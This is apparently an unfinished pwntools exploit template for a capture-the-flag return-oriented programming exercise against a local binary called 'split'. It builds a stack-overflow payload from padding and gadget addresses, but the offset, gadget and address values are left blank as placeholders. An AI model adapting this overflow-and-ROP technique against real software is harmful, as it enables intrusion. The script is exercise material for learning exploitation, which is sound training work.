#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

gs='''
continue
'''

# Set up pwntools for the correct architecture
elf =  ELF('split')
context.binary=elf

context(terminal=['tmux', 'split-window', '-h'])

useful_str=elf.symbols["usefulString"]
useful_fun=elf.symbols["usefulFunction"]

# Offset avant ecrasement de l'adresse de retour
offset=
# gadget : pop rdi; ret
pop_rdi=


if len(sys.argv)>1 and sys.argv[1] == "-d":
    # gdb.attach(io,gs)
    io = gdb.debug([elf.path], gs)
    time.sleep(.5)
else:
    io = process([elf.path])

print(f"{useful_str=:x}")
print(f"{useful_fun=:x}")

io.recvuntil(b"> ")

# Build the payload
PL =b"A"*offset
PL+=p64(xxxx)
PL+=p64(xxxx)
PL+=p64()

io.sendline(PL)
io.interactive()

